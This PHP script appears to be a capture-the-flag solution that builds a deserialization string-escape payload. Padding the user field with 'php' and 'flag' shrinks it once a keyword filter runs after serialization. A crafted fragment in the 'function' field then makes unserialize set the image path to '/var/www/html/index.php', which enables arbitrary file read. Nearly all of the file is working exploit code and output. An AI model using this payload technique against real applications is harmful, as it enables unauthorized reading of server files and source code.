<?php

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';
    return preg_replace($filter,'',$img);
}
echo base64_encode("guest_img.png")."\n";
$_SESSION["user"] = 'phpphpphpphpphpphpflag';
$_SESSION['function'] = ';s:8:"function";s:10:"show_image";s:3:"img";s:20:"Z3Vlc3RfaW1nLnBuZw==";}';
$_SESSION['img']="/var/www/html/index.php";

$serialize_info = filter(serialize($_SESSION));
// $a=serialize($_SESSION);
echo $serialize_info."\n";
echo serialize($_SESSION)."\n";
var_dump(unserialize('a:3:{s:4:"user";s:22:"";s:8:"function";s:76:";s:8:"function";s:10:"show_image";s:3:"img";s:23:"/var/www/html/index.php";}'));
var_dump(unserialize($serialize_info));
// echo json_encode($_SESSION);
// echo base64_encode("guest_img.png");


// a:3:{s:4:"user";s:22:"";s:8:"function";s:76:";s:8:"function";s:10:"show_image";s:3:"img";s:23:"/var/www/html/index.";}";s:3:"img";s:23:"/var/www/html/index.";}
// a:3:{s:4:"user";s:22:"";s:8:"function";s:76:";s:8:"function";s:10:"show_image";s:3:"img";s:23:"/var/www/html/index.php";}